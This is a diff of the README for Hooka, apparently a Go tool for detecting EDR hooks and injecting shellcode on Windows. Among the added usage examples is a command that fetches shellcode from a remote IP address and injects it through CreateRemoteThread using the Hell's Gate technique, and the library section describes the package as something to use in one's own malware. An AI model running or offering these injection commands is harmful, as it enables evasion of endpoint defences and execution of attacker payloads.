@@ -15,7 +15,7 @@
 
 I started this project 
 
-There's not to much info about detecting Windows hooks in ***Golang*** so I decided to try by my own and I've also taken some code from [BananaPhone]() project (thanks a lot to ***C-Sto**)
+There's not to much info about detecting Windows hooks in ***Golang*** so I decided to try by my own and I've also taken some code from [BananaPhone]() project (thanks a lot to ***C-Sto***)
 
 # Usage
 
@@ -26,7 +26,6 @@ git clone https://github.com/D3Ext/Hooka
 ```
 
 ```
-help panel
 ```
 
 > Detect hooked functions by EDR
@@ -44,18 +43,26 @@ help panel
 .\Hooka.exe --inject Fibers --file shellcode.bin
 ```
 
+> Inject shellcode using Hell's Gate
+```sh
+.\Hooka.exe --inject CreateRemoteThread --url http://192.168.116.37/shellcode.bin --hells
+```
+
 # Demo
+
+> Detecting hooks
+<img src="">
+
+> Injecting shellcode via CreateRemoteThread
+<img src="">
 
 # Library
 
 If you're looking to implement any function in your malware you can do it using the official library API:
 
-```go
-...
-
-
-
-...
+> First of all download the package
+```sh
+go get github.com/D3Ext/Hooka/pkg
 ```
 
 
